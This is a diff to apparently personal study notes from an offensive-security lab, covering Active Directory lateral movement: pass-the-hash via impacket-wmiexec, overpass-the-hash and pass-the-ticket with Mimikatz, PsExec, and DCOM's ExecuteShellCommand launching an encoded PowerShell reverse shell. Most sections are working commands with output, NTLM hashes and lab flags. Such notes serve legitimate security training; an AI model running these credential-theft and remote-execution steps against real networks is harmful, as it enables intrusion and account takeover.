@@ -1,7 +1,7 @@
 Password cracking takes time and may fail.
 Kerberos and NTLM do not use the clear text password directly, and native tools from Microsoft do not support authentication using the password hash.
 
-## WMI and WinRM
+# WMI and WinRM
 
 ### WMI
 *Windows Management Instrumentation*
@@ -184,7 +184,7 @@ Enter-PSSession 1
 ```
 
 
-## psexec
+# psexec
 - Replacement for telnet-like applications and provide remote execution of processes on other systems through an interactive console
 - Part of the SysInternals suite
 	- Not installed by default, but easily transferable
@@ -228,5 +228,342 @@ cd C:\Tools\SysinternalsSuite
 ```
 
 
-## AD Pass-The-Hash
+# AD Pass-The-Hash
+- Allows an attacker to auth to a remote system or service using a user's NTLM hash instead of their plaintext pw.
+- Will only work for servers or services using NTLM, not servers or services using Kerberos
+- Mapped in MITRE under [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) general technique
+- Used by:
+	- PsExec from Metasploit
+	- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+	- [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)
 
+##### PreReqs
+- Requires SMB connection
+- Windows File and Printer Sharing are enabled
+- ADMIN$ share must be available
+	- Must present valid credentials with local administrative perms
+- Local admin rights
+
+##### Mechanics
+More or less the same as non-domain connected PtH:
+- Attacker connects to the victim using SMB protocol
+- Performs auth using the NTLM hash
+
+Vulnerability lies in the fact that we gained unauthorized access to the password hash of a local admin
+
+Most tools built to abuse PtH can be leveraged to start a Win service & comm w/ it using Named Pipes using the [Service Control Manager](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx)
+
+- Use `impacket-wmiexec`
+```bash
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.227.72
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	[*] SMBv3.0 dialect used
+	[!] Launching semi-interactive shell - Careful what you execute
+	[!] Press help for extra shell commands
+	C:\>hostname
+		web04
+	
+	C:\>whoami
+		web04\administrator
+	
+	C:\>type c:\users\administrator\desktop\flag.txt
+		OS{c152f43fd9b142e595b6e6e8a5b891e2}
+```
+
+
+> Works for Active Directory domain accounts and the built-in local administrator account. However, due to the [2014 security update](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a), this technique can not be used to authenticate as any other local admin account.
+
+
+# Overpass the Hash
+
+Can over abuse a users's NTLM hash to gain a full Kerberos TGT.   Can then use the TGT to obtain a TGS.
+
+
+##### Scenario:
+- Compromised a workstation or server that `jen` has authenticated to
+- Assuming computer is caching their creds
+
+To simulate cached creds:
+- Login to Client76 as `offsec`
+- Run a process as a different user (`jen`)
+	- Shift Rt-click the Notepad icon on the desktop yielding the option
+		 ![](runas_diffUser.png)
+	- Afterwards, enter `jen`s creds
+
+
+However the creds are cached, proceed to use Mimikatz to turn the NTLM hash into a Kerberos ticket
+```powershell
+Start-Process powershell.exe -Verb runAs
+
+cd C:\tools\
+.\mimikatz.exe
+
+#Create PS process in context of admin
+privilege::debug
+	Privilege '20' OK
+
+sekurlsa::pth /domain:corp.com /user:jen /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+	user    : jen
+	domain  : corp.com
+	program : powershell
+	impers. : no
+	NTLM    : 369def79d8372408bf6e93364cc93075
+	  |  PID  7324
+	  |  TID  7892
+	  |  LSA Process is now R/W
+	  |  LUID 0 ; 1908628 (00000000:001d1f94)
+	  \_ msv1_0   - data copy @ 0000018169A76A80 : OK !
+	  \_ kerberos - data copy @ 00000181699655D8
+	   \_ aes256_hmac       -> null
+	   \_ aes128_hmac       -> null
+	   \_ rc4_hmac_nt       OK
+	   \_ rc4_hmac_old      OK
+	   \_ rc4_md4           OK
+	   \_ rc4_hmac_nt_exp   OK
+	   \_ rc4_hmac_old_exp  OK
+	   \_ *Password replace @ 00000181699A3DA8 (32) -> null
+```
+
+- In new PS window, check user & cached tickets
+```powershell
+whoami
+	client76\offsec
+
+hostname
+	CLIENT76
+
+klist
+	Current LogonId is 0:0x1d1f94
+	
+	Cached Tickets: (0)
+```
+	- Not surprising that there's currently no tickets as `jen` hasn't logged on interactively yet
+
+
+- Connect to web04 & check cached tickets
+```powershell
+net use \\web04
+	The command completed successfully.
+
+
+klist
+	Current LogonId is 0:0x1d1f94
+	
+	Cached Tickets: (2)
+	#0>     Client: jen @ CORP.COM
+	        Server: krbtgt/CORP.COM @ CORP.COM
+	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+	        Start Time: 9/1/2024 14:57:58 (local)
+	        End Time:   9/2/2024 0:57:58 (local)
+	        Renew Time: 9/8/2024 14:57:58 (local)
+	        Session Key Type: RSADSI RC4-HMAC(NT)
+	        Cache Flags: 0x1 -> PRIMARY
+	        Kdc Called: DC1.corp.com
+	
+	#1>     Client: jen @ CORP.COM
+	        Server: cifs/web04 @ CORP.COM
+	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+	        Start Time: 9/1/2024 14:57:58 (local)
+	        End Time:   9/2/2024 0:57:58 (local)
+	        Renew Time: 9/8/2024 14:57:58 (local)
+	        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+	        Cache Flags: 0
+	        Kdc Called: DC1.corp.com
+```
+	- Ticket #0 is a TGT because the server is krbtgt
+	- Ticket #1 is a TGS for the _Common Internet File System_ (CIFS) service
+
+
+We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication
+
+PsExec can run a command remotely but does not accept password hashes.
+Since we have generated Kerberos tickets and operate in the context of `jen` in the PowerShell session, we can reuse the TGT to obtain code execution on the `web04` host
+```powershell
+# Psexec to web04 & check user
+cd C:\tools\SysinternalsSuite\
+
+
+powershell -ep bypass
+	Windows PowerShell
+	Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+.\PsExec64.exe \\web04 cmd
+	PsExec v2.4 - Execute processes remotely
+	Copyright (C) 2001-2022 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+	
+	
+	Microsoft Windows [Version 10.0.20348.887]
+	(c) Microsoft Corporation. All rights reserved.
+
+	C:\Windows\system32>hostname
+		web04
+
+	C:\Windows\system32>whoami
+		corp\administrator
+```
+
+
+# Pass the Ticket
+
+While TGT can only be used on the machine it was created for, TGS can be exported, re-injected elsewhere, & used to auth to a specific service.
+If the service tickets belong to the current user, no admin privs are req'd
+
+##### Scenario
+- Abuse an existing session of `dave`
+- _dave_ user has privileged access to the _backup_ folder located on WEB04
+	- Logged-in user `jen` doesn't
+- Attack plan: extract all the current TGT/TGS in memory and inject _dave_'s WEB04 TGS into our own session
+
+- RDP as `jen` and test folder access
+```powershell
+whoami
+	corp\jen
+
+ls \\web04\backup
+	ls : Access to the path '\\web04\backup' is denied.
+	At line:1 char:1
+	+ ls \\web04\backup
+	+ ~~~~~~~~~~~~~~~~~
+	    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
+	    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+```
+
+- Launch mimikatz & export tickets
+```powershell
+cd C:\Tools\
+.\mimikatz.exe
+	
+	  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+	
+	mimikatz # privilege::debug
+	Privilege '20' OK
+	
+	# mimikatz
+	sekurlsa::tickets /export
+		
+		Authentication Id : 0 ; 1404738 (00000000:00156f42)
+		Session           : Batch from 0
+		User Name         : dave
+		Domain            : CORP
+		Logon Server      : DC1
+		Logon Time        : 9/1/2024 4:43:35 PM
+		SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+		
+				 * Username : dave
+				 * Domain   : CORP.COM
+				 * Password : (null)
+		
+				Group 0 - Ticket Granting Service
+				...
+```
+	- Cmd parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format
+	- Way too long to sift through like this, but first item shows `dave` initiated a service
+
+
+- Verify newly generated tickets with **dir**, filtering out on the **kirbi** extension
+```powershell
+dir *.kirbi
+	 Volume in drive C has no label.
+	 Volume Serial Number is 686D-15D0
+	
+	 Directory of C:\Tools
+	
+	09/01/2024  04:43 PM             1,577 [0;12a952]-0-0-40810000-dave@cifs-web04.kirbi
+	09/01/2024  04:43 PM             1,521 [0;12a952]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+	09/01/2024  04:43 PM             1,577 [0;132c07]-0-0-40810000-dave@cifs-web04.kirbi
+	09/01/2024  04:43 PM             1,521 [0;132c07]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+	09/01/2024  04:43 PM             1,577 [0;1369ef]-0-0-40810000-dave@cifs-web04.kirbi
+	09/01/2024  04:43 PM             1,521 [0;1369ef]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+	09/01/2024  04:43 PM             1,577 [0;146205]-0-0-40810000-dave@cifs-web04.kirbi
+	09/01/2024  04:43 PM             1,521 [0;146205]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+	09/01/2024  04:43 PM             1,577 [0;149ffb]-0-0-40810000-dave@cifs-web04.kirbi
+	...
+```
+	- Can pick any TGS ticket in the **dave@cifs-web04.kirbi** format
+
+
+-  Inject it through mimikatz via the **kerberos::ptt** command & check for success
+```powershell
+kerberos::ptt [0;12a952]-0-0-40810000-dave@cifs-web04.kirbi
+
+	* File: '[0;12a952]-0-0-40810000-dave@cifs-web04.kirbi': OK
+
+
+klist
+	Current LogonId is 0:0xba63b
+	
+	Cached Tickets: (1)
+	
+	#0>     Client: dave @ CORP.COM
+	        Server: cifs/web04 @ CORP.COM
+	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
+	        Start Time: 9/1/2024 16:40:19 (local)
+	        End Time:   9/2/2024 2:40:19 (local)
+	        Renew Time: 9/8/2024 16:40:19 (local)
+	        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+	        Cache Flags: 0
+	        Kdc Called:
+```
+	- `dave` ticket has been successfully imported in our own session for the `jen` user
+
+- Now list contents of folder
+```powershell
+ls \\web04\backup
+	Directory: \\web04\backup
+	
+	Mode                LastWriteTime         Length Name
+	----                -------------         ------ ----
+	-a----        9/13/2022   5:52 AM              0 backup_schemata.txt
+	-a----         9/1/2024   4:38 PM             78 flag.txt
+```
+
+# DCOM
+- [Distributed Component Object Model](https://msdn.microsoft.com/en-us/library/cc226801.aspx)
+- Very old techs
+
+#### COM (Component Object Model)
+- System for creating software components that interact with each other
+- Created for either same-process or cross-process interaction
+
+#### DCOM
+- For interaction between multiple computers over a network
+- Essentially an API
+- Performed over RPC on TCP port 135
+- Local admin access is req to call the service
+
+Lateral movement techniques
+- Based on the [_Microsoft Management Console_](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page) (MMC) COM application
+	- Employed for scripted automation of Windows systems
+
+#### MMC
+- Allows the creation of [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN), which expose the _ExecuteShellCommand_ method under the _Document.ActiveView_ property.
+	- Allows the execution of any shell command as long as the authenticated user is authorized
+		- Default for local administrators.
+
+##### Scenario
+- `jen` user logged into `client74`
+- Instantiate a remote MMC 2.0 application by specifying the target IP of `files04` as the second argument of the _GetTypeFromProgID_ method
+	- Need elevated PS prompt
+
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+```
+
+- Pass the required argument to the application via the [**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand) method & use an encoded PS revshell
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdA.....GUAKAApAA==","7")
+```
+
+
+# Persistance
